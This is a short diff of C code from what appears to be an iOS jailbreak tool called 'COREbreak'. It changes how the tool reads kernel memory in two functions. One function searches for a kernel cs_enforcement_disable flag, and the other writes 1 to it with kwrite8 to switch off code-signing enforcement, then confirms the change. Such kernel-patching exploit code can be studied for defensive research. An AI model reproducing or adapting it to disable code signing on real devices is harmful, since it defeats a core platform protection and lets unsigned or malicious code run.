@@ -270,10 +270,9 @@ static uint64_t search_cs_enforcement_disable(void)
         uint64_t addr = base + s_cs_enforcement_disable_offsets[i].offset;
         if (!is_kaddr_valid(addr)) continue;
 
-        // Read current value
-        uint8_t val = kread8(addr);
+        uint8_t val = 0;
+        kreadbuf(addr, &val, 1);
 
-        // If it's 0 (enforcement enabled), we can write 1 to disable
         if (val == 0 || val == 1) {
             printf("[COREbreak] candidate cs_enforcement_disable at 0x%llx (val=%u)\n",
                    addr, val);
@@ -336,7 +335,8 @@ bool coretrust_amfi_enforcement_flags_zero(void)
 
     // Disable code signing enforcement
     kwrite8(addr, 1);
-    uint8_t check = kread8(addr);
+    uint8_t check = 0;
+    kreadbuf(addr, &check, 1);
     if (check == 1) {
         printf("[COREbreak] ✅ cs_enforcement_disable = 1\n");
         return true;
